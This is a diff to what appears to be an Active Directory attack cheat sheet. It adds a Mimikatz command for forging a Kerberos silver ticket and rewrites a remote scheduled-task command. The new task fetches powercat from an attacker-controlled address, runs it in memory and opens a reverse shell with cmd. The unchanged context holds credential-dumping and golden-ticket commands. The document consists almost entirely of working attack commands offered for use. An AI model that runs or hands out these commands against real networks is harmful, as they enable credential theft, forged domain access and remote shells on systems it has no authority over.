@@ -143,13 +143,19 @@ Invoke-Mimikatz -Command '"sekurlsa::ekeys"' (to get AES keys)
 
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' (credentials like those used for scheduled tasks are stored in the credential vault)
 
-# Golden Ticket
+# Golden & Silver Ticket
+  
+## With ticketer
 
 ticketer.py -nthash <krbtgthash> -domain-sid <sid> -user-id 500 -domain <domain> <user>
 
 getST.py -k -no-pass -dc-ip <IP> -spn cifs/<FQDNMachine> <domain>/<user>
 
 psexec.py -k -no-pass -dc-ip <IP> <domain>/<user>@<FQDNMachine>
+
+## With Mimikatz
+
+Invoke-Mimikatz -Command '"kerberos::golden /domain:<..> /sid:<..> /target:<FQDN> /service:HOST /rc4:<hash> /user:Administrator /ptt'" (silver)
 
 # Enum Delegation
 
@@ -235,7 +241,7 @@ Via schedule task (ex: when u get silver ticket to a dc):
   ```
    schtasks /create /S <COMPUTER> /SC
 Weekly /RU "NT Authority\SYSTEM" /TN myTask /TR "powershell.exe -c 'iex
-(New-Object Net.WebClient).DownloadString(''http://<my_ip_addr>/InvokePowerShellTcp.ps1''')'"
+(New-Object Net.WebClient).DownloadString(''http://<my_ip_addr>/powercat''');salut -c <ip> <port> -e cmd'"
 
  schtasks /Run /S <COMPUTER> /TN myTask
   ```
